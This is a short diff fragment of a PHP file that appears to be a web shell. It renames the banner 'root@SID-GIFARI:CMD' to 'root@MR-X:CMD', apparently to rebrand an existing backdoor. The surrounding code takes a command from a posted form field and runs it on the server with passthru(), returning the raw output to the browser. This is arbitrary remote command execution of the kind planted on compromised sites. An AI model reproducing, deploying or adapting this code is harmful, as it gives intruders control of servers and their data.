@@ -1212,13 +1212,13 @@ echo $auth['script'];
         }
 
         // Execute the command and display output using passthru
-        echo "<strong>root@SID-GIFARI:CMD</strong><br><pre>";
+        echo "<strong>root@MR-X:CMD</strong><br><pre>";
         passthru($cmd);  // passthru sends raw output directly to the browser
         echo "</pre>";
     }
     ?>
     <form method="post" action="<?=$url_inc?>">
-        <input type="text" name="terminal-text" size="20" placeholder="root@SID-GIFARI:CMD" required>
+        <input type="text" name="terminal-text" size="20" placeholder="root@MR-X:CMD" required>
         <input type="hidden" name="path" value="<?=$path?>" />
         <input type="submit" name="terminal" value="Execute">
     </form>
